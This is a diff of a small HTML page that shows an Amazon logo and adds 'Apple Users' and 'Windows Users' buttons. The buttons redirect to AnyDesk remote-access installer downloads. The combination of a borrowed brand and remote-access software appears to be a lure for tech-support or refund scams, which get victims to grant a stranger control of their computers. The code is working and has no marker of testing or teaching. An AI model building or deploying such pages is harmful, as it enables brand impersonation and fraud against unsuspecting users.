@@ -7,14 +7,32 @@
     <style>
         body {
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             height: 100vh;
             background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
         }
         #amazon-logo {
             cursor: pointer;
             width: 200px; /* Adjust the size as needed */
+            margin-bottom: 20px; /* Space between logo and options */
+        }
+        .options {
+            display: flex;
+            gap: 20px; /* Space between options */
+        }
+        .option {
+            padding: 10px 20px;
+            border: 1px solid #007185;
+            border-radius: 5px;
+            background-color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .option:hover {
+            background-color: #e7f3ff; /* Light blue on hover */
         }
     </style>
 </head>
@@ -22,14 +40,24 @@
 
     <img id="amazon-logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
 
+    <div class="options">
+        <div class="option" onclick="redirectTo('https://anydesk.com/en/downloads/thank-you?dv=mac_dmg')">Apple Users</div>
+        <div class="option" onclick="redirectTo('https://anydesk.com/en/downloads/thank-you?dv=win_exe')">Windows Users</div>
+    </div>
+
     <script>
         // URL to redirect to when the logo is clicked
-        const redirectUrl = "https://www.amazon.com";
+        const amazonUrl = "https://www.amazon.com";
 
         // Add click event listener to the logo
         document.getElementById('amazon-logo').addEventListener('click', function() {
-            window.location.href = redirectUrl;
+            window.location.href = amazonUrl;
         });
+
+        // Function to redirect based on user option
+        function redirectTo(url) {
+            window.location.href = url;
+        }
     </script>
 
 </body>
